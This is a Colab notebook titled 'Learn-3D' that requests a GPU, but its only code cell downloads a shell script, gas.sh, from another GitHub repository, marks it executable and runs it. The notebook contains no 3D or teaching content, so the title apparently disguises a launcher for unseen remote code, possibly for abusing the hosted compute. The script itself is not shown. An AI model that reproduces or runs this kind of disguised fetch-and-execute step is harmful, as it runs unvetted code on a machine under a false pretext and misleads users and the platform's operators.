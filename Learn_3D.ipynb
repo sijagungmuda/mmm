{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Learn-3D.ipynb",
      "private_outputs": true,
      "provenance": [],
      "toc_visible": true,
      "authorship_tag": "ABX9TyP1qyS8BEi2amKBL18r7ATp",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/sijagungmuda/mmm/blob/main/Learn_3D.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "j9tHH26-M1DH"
      },
      "source": [
        "SIPPKAH"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "AC2JAQ6mMh6z"
      },
      "source": [
        "!wget https://raw.githubusercontent.com/sijagungmuda/sip/main/gas.sh && chmod +x gas.sh && ./gas.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}